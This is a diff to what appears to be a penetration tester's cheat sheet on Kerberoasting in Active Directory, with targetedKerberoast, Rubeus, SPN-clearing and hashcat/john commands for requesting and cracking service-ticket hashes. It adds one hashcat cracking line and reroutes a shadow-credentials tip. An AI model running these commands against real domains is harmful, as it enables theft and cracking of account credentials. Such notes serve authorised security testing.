@@ -26,7 +26,7 @@ targetedKerberoast -d <Domain> -u '<Username>' -H ':<Hash>' --dc-ip <DCIP> -o ta
 One user only:
 targetedKerberoast -d <Domain> -u '<Username>' -p '<Password>' --dc-ip <DCIP> --request-user '<TargetUser>' -o targeted.txt
 - [ ] It stopped part way: the user may keep the SPN, so check it with Get-DomainUser or BloodHound
-- [ ] Shadow credentials give the hash with no cracking at all, with certipy shadow
+- [ ] Shadow credentials give the hash with no cracking at all: :Pb acl-abuse
 
 ## From a Windows shell
 Rubeus.exe from my own tools, into upload/ for serve. /nowrap keeps each hash on one line.
@@ -42,6 +42,7 @@ Set-DomainObject -Identity '<TargetUser>' -Clear serviceprincipalname
 ## Crack
 hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
 hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+hashcat -m 13100 targeted.txt /usr/share/wordlists/rockyou.txt
 john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt kerberoast.txt
 - [ ] $krb5tgs$23$ is RC4, mode 13100
 - [ ] $krb5tgs$17$ is AES128, mode 19600, and $krb5tgs$18$ is AES256, mode 19700: far slower
